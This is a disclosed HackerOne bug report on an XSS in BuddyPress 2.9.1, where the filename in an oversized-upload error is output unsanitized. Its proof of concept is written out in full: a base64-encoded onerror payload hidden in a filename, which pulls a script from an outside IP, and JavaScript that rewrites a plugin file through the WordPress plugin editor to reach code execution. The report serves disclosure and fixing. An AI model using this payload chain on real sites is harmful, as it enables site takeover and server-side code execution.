# Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS leading to potential RCE. 

## Report Details
- **Report ID**: 263109
- **URL**: https://hackerone.com/reports/263109
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-08-24T22:55:44.354Z
- **Disclosed**: 2017-11-02T17:04:35.375Z

## Reporter
- **Username**: skansing
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
# Description
This report is very similar to https://hackerone.com/bugs?subject=user&report_id=203515 so I will not go into too much details.

When uploading a avatar or profile background image thats larger than allowd, the error containing the filename will be output unsanitized leading to XSS. Making the victim upload a strangely named file for his profile requires some social engineering. Any user is vuln, but has to be admin to escalate to RCE.

The interfaces for upload that are vuln can be found at
domain.tld/members/USERNAME/profile/change-cover-image/
domain.tld/members/bbuser/profile/change-avatar/
domain.tld/wp-admin/users.php?page=bp-profile-edit
 
# POC
The POC explores a chain of XSS => XSSI => RCE via same origin scripting, the route via XSSI is mainly due to file and char length restrictions

- Login as admin
- Goto `/wp-admin/users.php?page=bp-profile-edit`
- Upload a file with the following name (mentioned below) as admin for.

Filename 
`POC<img src=x onerror='document.write(atob("UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4="))'>`

The base64 data can be verified by
`btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');` in the browser conole.

This scripts loads the RCE script that changes the hello.php with <?php phpinfo() and redirect to it.
```
var i = document.createElement("iframe");
i.src = "http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php";
document.querySelector("body").appendChild(i);
setTimeout(function() {
  var p = "<?php phpinfo();"
  var d = document.querySelector("iframe").contentWindow.document;
  var c = d.querySelector("#newcontent")
  var s = d.querySelector("#submit")
  c.value = p
  s.click();
}, 2000);
setTimeout(function() {
  window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"
}, 4000);
```

# Suggested fix
Sanitize the error. I suspect it needs a run through `.html()` as in #203515


## Attachments
No attachments
